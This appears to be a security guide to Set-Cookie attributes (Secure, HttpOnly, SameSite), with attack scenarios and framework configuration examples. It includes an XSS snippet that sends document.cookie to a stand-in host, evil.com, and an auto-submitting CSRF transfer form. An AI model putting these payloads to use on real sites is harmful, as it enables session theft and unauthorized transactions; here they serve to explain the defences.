# Set-Cookie Security Header

## Quick Reference

**Header:** `Set-Cookie`
**Purpose:** Secure cookie attributes to prevent session hijacking and CSRF
**Severity if Missing:** Medium (if cookies are used)
**Complexity:** Medium

**Best Practice:**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=86400; Path=/
```

---

## What It Does

Set-Cookie header creates cookies on the client. Security attributes control how browsers handle these cookies, preventing common attacks like session hijacking, XSS cookie theft, and CSRF.

---

## Security Attributes

### Secure
Ensures cookie only sent over HTTPS, never HTTP.
```
Set-Cookie: session=abc123; Secure
```

### HttpOnly
Prevents JavaScript access to cookie (blocks XSS theft).
```
Set-Cookie: session=abc123; HttpOnly
```

### SameSite
Controls cross-site cookie transmission:
- **Strict** - Never sent with cross-site requests (strongest)
- **Lax** - Sent with top-level navigation (balanced)
- **None** - Sent with all requests (requires Secure)

```
Set-Cookie: session=abc123; SameSite=Strict
```

---

## Real-World Attack Scenarios

### Attack 1: Session Hijacking via XSS

**Without HttpOnly:**

**Attacker injects XSS:**
```html
<script>
fetch('https://evil.com?cookie=' + document.cookie);
</script>
```

**Result:** Session cookie stolen, account compromised

---

**With HttpOnly:**

```
Set-Cookie: session=abc123; HttpOnly
```

**JavaScript attempt:**
```javascript
document.cookie  // Returns empty string
```

**Result:** Cookie protected from XSS

---

### Attack 2: CSRF

**Without SameSite:**

**Attacker's page:**
```html
<form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Browser sends cookie with request** → Money transferred

---

**With SameSite=Strict:**

```
Set-Cookie: session=abc123; SameSite=Strict
```

**Browser blocks cross-site cookie** → Attack fails

---

### Attack 3: Man-in-the-Middle

**Without Secure:**

**HTTP request includes cookie:**
```
GET /page HTTP/1.1
Cookie: session=abc123
```

**Attacker on network sniffs unencrypted HTTP** → Session stolen

---

**With Secure:**

```
Set-Cookie: session=abc123; Secure
```

**Cookie only sent over HTTPS** → Protected from eavesdropping

---

## Configuration Examples

### Good ✅
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600; Path=/
```

All security attributes present.

### Acceptable ⚠️
```
Set-Cookie: token=xyz; Secure; HttpOnly; SameSite=Lax
```

Using Lax instead of Strict (allows some cross-site requests).

### Bad ❌
```
Set-Cookie: session=abc123
```

No security attributes - vulnerable to all attacks.

### Dangerous ❌
```
Set-Cookie: session=abc123; SameSite=None
```

SameSite=None without Secure is rejected by browsers.

---

## Common Mistakes

**1. Missing Secure on HTTPS Sites**
Always use Secure if serving over HTTPS.

**2. Not Using HttpOnly for Session Cookies**
Session cookies should always be HttpOnly.

**3. SameSite=None without Secure**
Invalid combination, browser rejects.

**4. Overly Long Max-Age**
```
Max-Age=31536000  # 1 year - too long for session cookies
```
Use shorter expiry for sensitive cookies.

---

## Implementation

**Express.js:**
```javascript
res.cookie('session', 'value', {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
});
```

**PHP:**
```php
setcookie('session', 'value', [
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

**Django:**
```python
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
```

---

## Browser Compatibility

| Attribute | Support |
|-----------|---------|
| Secure | All browsers |
| HttpOnly | All modern browsers |
| SameSite | Chrome 51+, Firefox 60+, Safari 12+ |

**SameSite** not supported in IE11 (degrades gracefully).

---

## See Also

- [HSTS](HSTS.md) - Enforce HTTPS
- [CSP](CSP.md) - Additional XSS protection
- [Analyzer Docs](../ANALYZERS.md#set-cookie)

---

**Last Updated:** 2025-12-12
**Status:** Active
